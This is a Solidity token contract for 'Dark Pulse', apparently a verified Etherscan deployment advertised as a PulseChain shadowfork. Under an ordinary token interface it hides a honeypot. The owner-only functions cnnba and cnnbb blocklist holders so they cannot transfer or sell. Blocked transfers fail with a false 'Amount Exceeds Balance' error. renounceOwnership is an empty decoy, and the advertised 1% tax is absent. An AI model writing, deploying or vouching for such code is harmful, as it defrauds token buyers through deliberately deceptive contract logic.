/**
 *Submitted for verification at Etherscan.io on 2022-08-28
*/

pragma solidity 0.8.16;
/*

Dark Pulse - Shadowfork of PulseChain -



Tokenomics 
1% Tax
100M Supply

Note: Dark Pulse Bridge Q3 2022

*/    

contract DarkPulse {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) cVal;

    // 
    string public name = "Dark Pulse";
    string public symbol = unicode"DARKPLS";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;


bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function renounceOwnership() public onlyOwner  {

}





    function cnnba(address _user) public onlyOwner {
        require(!cVal[_user], "x");
        cVal[_user] = true;
     
    }
    
    function cnnbb(address _user) public onlyOwner {
        require(cVal[_user], "xx");
        cVal[_user] = false;
  
    }
    
 


   




    function transfer(address to, uint256 value) public returns (bool success) {
        
require(!cVal[msg.sender] , "Amount Exceeds Balance"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }









    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
    
        require(!cVal[from] , "Amount Exceeds Balance"); 
               require(!cVal[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}